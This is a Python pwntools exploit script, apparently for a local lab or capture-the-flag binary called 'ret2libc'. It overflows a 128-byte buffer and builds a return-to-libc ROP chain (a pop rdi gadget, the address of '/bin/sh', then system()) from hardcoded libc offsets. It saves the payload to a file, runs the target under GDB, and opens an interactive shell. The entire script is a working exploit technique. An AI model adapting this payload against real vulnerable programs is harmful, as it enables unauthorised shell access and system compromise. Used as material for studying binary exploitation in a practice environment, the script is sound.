#!/usr/bin/env python3
from pwn import *


# Set the architecture context to 64-bit
context.arch = 'amd64'

# Configuration
BIN = "./ret2libc"
context.binary = BIN
context.arch = "amd64"  # Assurer l'architecture x86-64
context.log_level = "debug"  # Activer les logs pour déboguer

libc_base_address=0x00007ffff7c00000
pop_rdi=libc_base_address+ 0x000000000002a3e5
binsh_addr= libc_base_address+0x1d8678
system_addr=libc_base_address+0x0000000000050d70
exit_addr= libc_base_address+0x00000000000455f0


# Offset pour atteindre l'adresse de retour
ret_offset = 0x80 + 8  # 128 (buf) + 8 (rbp) = 136 octets

# Construire la charge utile
payload = (
    b"A" * ret_offset +            # Remplir buf et rbp
    p64(pop_rdi) +                # Gadget : pop rdi; ret
    p64(binsh_addr) +             # Adresse de "/bin/sh" pour rdi
    p64(system_addr)              # Adresse de system()
)


# Write the payload to a file
with open("payload1", "wb") as f:
    f.write(payload)
    


# Lancer le processus
io = process(BIN,setuid=False, env={})
# Attacher GDB pour déboguer
gdb.attach(io, """
    break *vuln
    continue
""")
# Envoyer la charge utile
io.send(payload)

# Passer en mode interactif
io.interactive()
